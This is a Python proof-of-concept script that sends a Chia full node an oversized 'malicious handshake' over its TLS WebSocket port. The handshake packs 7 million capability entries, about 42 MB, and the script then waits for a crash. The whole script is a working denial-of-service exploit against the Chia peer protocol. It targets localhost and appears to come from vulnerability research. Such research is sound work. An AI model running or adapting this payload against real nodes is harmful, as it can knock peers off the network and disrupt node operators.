
import asyncio
import ssl
import aiohttp
from chia_rs.sized_ints import uint16, uint8
import os

async def run_poc():
    root = "/home/jules/.chia/mainnet/config/ssl/"
    ca_cert = root + "ca/chia_ca.crt"
    cert = root + "full_node/public_full_node.crt"
    key = root + "full_node/public_full_node.key"

    ssl_context = ssl.create_default_context(cafile=ca_cert)
    ssl_context.load_cert_chain(certfile=cert, keyfile=key)
    ssl_context.check_hostname = False
    ssl_context.verify_mode = ssl.CERT_REQUIRED

    net_id = "mainnet"
    proto_ver = "0.0.36"
    soft_ver = "1.8.0"
    # 7 million * 6 bytes = 42MB, which is < 50MB max message size
    num_caps = 7000000

    print(f"Constructing malicious handshake with {num_caps} capabilities...")
    data = len(net_id).to_bytes(4, 'big') + net_id.encode()
    data += len(proto_ver).to_bytes(4, 'big') + proto_ver.encode()
    data += len(soft_ver).to_bytes(4, 'big') + soft_ver.encode()
    data += uint16(8444).to_bytes(2, 'big')
    data += uint8(1).to_bytes(1, 'big') # NodeType.FULL_NODE

    data += num_caps.to_bytes(4, 'big')
    cap_entry = uint16(1).to_bytes(2, 'big') + b"\x00\x00\x00\x00"
    # To speed up construction
    data += cap_entry * num_caps

    msg_type = uint8(1) # ProtocolMessageTypes.handshake
    msg_id_present = b"\x00"
    msg_data = data

    full_msg_data = msg_type.to_bytes(1, 'big') + msg_id_present + len(msg_data).to_bytes(4, 'big') + msg_data

    url = "https://127.0.0.1:8444/ws"

    print(f"Full message size: {len(full_msg_data) / (1024*1024):.2f} MB")

    connector = aiohttp.TCPConnector(ssl=ssl_context)
    async with aiohttp.ClientSession(connector=connector) as session:
        try:
            async with session.ws_connect(url, max_msg_size=100*1024*1024) as ws:
                print("Connected, sending malicious handshake...")
                await ws.send_bytes(full_msg_data)
                print("Sent. Waiting for response or crash...")
                async for msg in ws:
                    print(f"Received msg: {msg.type}")
        except Exception as e:
            print(f"Connection error: {e}")

if __name__ == "__main__":
    asyncio.run(run_poc())
